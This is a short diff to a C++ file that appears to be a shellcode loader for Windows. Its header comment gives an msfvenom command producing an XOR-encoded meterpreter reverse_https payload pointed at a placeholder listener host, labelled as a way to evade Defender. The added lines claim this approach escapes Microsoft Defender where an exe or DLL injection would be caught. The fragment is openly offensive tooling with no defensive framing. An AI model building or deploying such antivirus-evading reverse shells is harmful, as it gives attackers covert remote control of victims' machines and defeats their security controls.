@@ -5,6 +5,8 @@
 // To evade defender:
 //  msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x.x.x.x LPORT=443 --encoder x64/xor_dynamic -f c 
 
+//  This actually works without getting caught by Defender.  Other methods, like generating an exe with
+// this same payload/encoder or doing dll injection (dll_inject.cpp) will get caught
 
 #include <iostream>
 #include <windows.h>
